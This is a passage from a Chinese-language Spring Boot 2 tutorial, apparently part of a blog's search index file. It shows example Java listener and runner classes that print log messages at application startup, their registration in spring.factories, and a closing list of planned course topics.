&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>MyApplicationListener.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.context.ApplicationEvent;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onApplicationEvent</span><span class="hljs-params">(ApplicationEvent event)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MyApplicationListener.....onApplicationEvent...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>MyApplicationRunner.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.ApplicationArguments;<br><span class="hljs-keyword">import</span> org.springframework.boot.ApplicationRunner;<br><span class="hljs-keyword">import</span> org.springframework.core.annotation.Order;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><br><span class="hljs-meta">@Order(1)</span><br><span class="hljs-meta">@Component</span><span class="hljs-comment">//放入容器</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationRunner</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(ApplicationArguments args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;MyApplicationRunner...run...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>MyCommandLineRunner.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.CommandLineRunner;<br><span class="hljs-keyword">import</span> org.springframework.core.annotation.Order;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 应用启动做一个一次性事情</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Order(2)</span><br><span class="hljs-meta">@Component</span><span class="hljs-comment">//放入容器</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCommandLineRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CommandLineRunner</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String... args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;MyCommandLineRunner....run....&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>MySpringApplicationRunListener.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.ConfigurableBootstrapContext;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplicationRunListener;<br><span class="hljs-keyword">import</span> org.springframework.context.ConfigurableApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.core.env.ConfigurableEnvironment;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySpringApplicationRunListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SpringApplicationRunListener</span> &#123;<br><br>    <span class="hljs-keyword">private</span> SpringApplication application;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MySpringApplicationRunListener</span><span class="hljs-params">(SpringApplication application, String[] args)</span>&#123;<br>        <span class="hljs-built_in">this</span>.application = application;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">starting</span><span class="hljs-params">(ConfigurableBootstrapContext bootstrapContext)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....starting....&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">environmentPrepared</span><span class="hljs-params">(ConfigurableBootstrapContext bootstrapContext, ConfigurableEnvironment environment)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....environmentPrepared....&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextPrepared</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....contextPrepared....&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoaded</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....contextLoaded....&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">started</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....started....&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">running</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....running....&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">failed</span><span class="hljs-params">(ConfigurableApplicationContext context, Throwable exception)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....failed....&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注册<code>MyApplicationContextInitializer</code>，<code>MyApplicationListener</code>，<code>MySpringApplicationRunListener</code>:</p><p><code>resources / META-INF / spring.factories</code>:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">org.springframework.context.ApplicationContextInitializer</span>=<span class="hljs-string">\</span><br><span class="hljs-string">  com.lun.boot.listener.MyApplicationContextInitializer</span><br><br><span class="hljs-attr">org.springframework.context.ApplicationListener</span>=<span class="hljs-string">\</span><br><span class="hljs-string">  com.lun.boot.listener.MyApplicationListener</span><br><br><span class="hljs-attr">org.springframework.boot.SpringApplicationRunListener</span>=<span class="hljs-string">\</span><br><span class="hljs-string">  com.lun.boot.listener.MySpringApplicationRunListener</span><br></code></pre></td></tr></table></figure><h2 id="87、后会有期"><a href="#87、后会有期" class="headerlink" title="87、后会有期"></a>87、后会有期</h2><blockquote><p>路漫漫其修远兮，吾将上下而求索。</p></blockquote><blockquote><p>纸上得来终觉浅，绝知此事要躬行。</p></blockquote><ul><li><p>Spring Boot 2 场景整合篇</p><ul><li>虚拟化技术</li><li>安全控制</li><li>缓存技术</li><li>消息中间件</li><li>对象存储</li><li>定时调度</li><li>异步任务</li><li>分布式系统</li></ul></li><li><p>Spring Boot 2 响应式编程</p><ul><li>响应式编程基础</li><li>Webflux开发Web应用</li><li>响应式访问持久化层</li><li>响应式安全开发</li><li>响应式原理</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>SpringBoot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
